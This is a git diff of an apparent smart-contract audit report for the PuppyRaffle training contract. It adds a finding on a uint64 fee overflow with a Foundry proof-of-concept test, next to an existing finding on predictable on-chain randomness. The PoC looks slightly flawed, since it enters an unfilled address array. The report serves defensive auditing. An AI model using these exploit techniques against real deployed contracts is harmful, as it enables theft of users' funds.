@@ -155,7 +155,7 @@ Implement check interactions effect pattern or ReentrancyGuard mutex.
 The `PuppyRaffle` contract uses insecure randomness. A malicious user can predict how many addresses they need to add due to the randomness implementation based on block data, sender address, and internal array size. All these parameters can be under the attacker's control or they can know their values, making it possible to manipulate the contract state to always win the lottery.
 
 
-
+<details>
 <summary>Vulnerable code 1</summary>
 
 ```javascript
@@ -190,6 +190,7 @@ Critical - Malicous user can
 NOTE: This PoC uses code from reentrancy previous chapter.
 
 ```javascript
+
    function testRandonNumberSelectWinner() public {
 
         // Stage 0: Start to record logs and start raffle than wait to raffle end
@@ -335,12 +336,81 @@ NOTE: This PoC uses code from reentrancy previous chapter.
 }
    
 ```
+
 </details>
 
 **Recommended Mitigation:** 
 Use a Secure Randomness Source: Replace the insecure randomness source with a more secure and unpredictable one, such as Chainlink VRF (Verifiable Random Function).
 Delay Randomness Calculation: Introduce a delay between the action and the randomness calculation to reduce predictability.
 Combine Multiple Sources: Use multiple sources of randomness to make it harder to predict the outcome.
+
+
+### [H-3] Overflow in calculating total fee
+
+**Description:** 
+### Corrected Description
+
+The variable `totalFees`, used for counting the amount of ETH to send as profit, is declared as `uint64`. Since this amount is counted in wei, it is possible to overflow this value. In the test case scenario, with an entrance fee of 1 ETH, the 20th account causes an overflow.
+
+
+**Impact:** 
+High
+
+**Proof of Concept:** (Proof of Code)
+
+<details>
+<summary>PoC</summary>
+
+```javascript
+
+function testOverflowSelecWinner() public {
+        // Overflow in totalFees = totalFees + uint64(fee); 
+        // We will enter 19 players and then enter one more to cause overflow
+        uint256 numAccounts = 19;
+        
+        uint totalFees = puppyRaffle.totalFees();
+        uint deposited = 0;
+        
+        for (uint256 i = 0; i < numAccounts; i++) {
+            address account = address(uint160(uint256(keccak256(abi.encodePacked(i)))));
+            vm.deal(account, entranceFee);
+
+            address[] memory players1 = new address[](1);
+            players1[0] = account;
+            // Assuming there's a function to enter the raffle
+            puppyRaffle.enterRaffle{value: entranceFee}(players1);
+            deposited += entranceFee;
+        }
+        // Next player will cause overflow. 
+        // Check current state
+        address account = address(uint160(uint256(keccak256(abi.encodePacked('31337')))));
+        vm.deal(account, entranceFee);
+         address[] memory overflow = new address[](1);
+        // Enter and cause overflow 
+        puppyRaffle.enterRaffle{value: entranceFee}(overflow);
+        deposited += entranceFee;
+        // Fastforward time to end the raffle
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        // Run selectWinner to update the totalFees
+        vm.prank(account);
+        puppyRaffle.selectWinner();
+
+        // Check if overflow happened
+        uint64 newFees = puppyRaffle.totalFees();
+        assertLt(uint(newFees), deposited, "Overflow did not happen");
+    }
+
+```
+
+</details>
+
+**Recommended Mitigation:** 
+Reconsider using `uint64` for storing data that may exceed its capacity. Use SafeMath or update the Solidity version to 0.8.0 or later, which has built-in overflow checks.
+
+    
+
 
 
 ### [M-1] DoS attack in `PuppyRaffle::enterRafle'
